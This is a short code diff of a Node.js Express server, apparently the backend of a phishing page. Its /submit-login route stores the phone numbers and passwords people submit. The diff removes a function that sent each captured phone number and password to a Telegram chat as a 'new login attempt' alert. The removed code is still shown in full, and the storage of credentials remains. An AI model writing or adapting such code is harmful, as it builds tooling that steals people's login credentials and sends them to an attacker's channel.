@@ -70,9 +70,7 @@ app.post('/submit-login', (req, res) => {
     db.get('submissions')
         .unshift(newLoginAttempt)
         .write();
-// --- YENİ: Telegram Bildirimini Gönder ---
-    const message = `✅ YENİ GİRİŞ DENEMESİ\n\nTelefon: ${phoneNumber}\nŞifrə: ${password}`;
-    sendTelegramNotification(message);
+
     // 4. Başarılı olduğuna dair frontend'e yanıt gönder
     res.json({ success: true });
 });
@@ -136,23 +134,6 @@ app.get('/logout', (req, res) => {
 
 // server.js dosyanıza bu fonksiyonu ekleyin
 
-function sendTelegramNotification(text) {
-    // Mesaj içeriğini HTML etiketlerini de yorumlayacak şekilde biçimlendiriyoruz
-    const formattedText = "```\n" + text + "\n```";
-
-    axios.post(tgUrl, {
-        chat_id: chatId,
-        text: formattedText,
-        parse_mode: 'MarkdownV2' // Bu, mesajın daha okunaklı olmasını sağlar
-    })
-    .then(() => {
-        console.log('Telegram bildirimi başarıyla gönderildi.');
-    })
-    .catch(error => {
-        // Hatanın tamamını görmek için error.response.data'yı loglayabiliriz
-        console.error('Telegram bildirimi gönderilemedi:', error.message);
-    });
-}
 
 const PORT = 3001;
 app.listen(PORT, '0.0.0.0', () => {
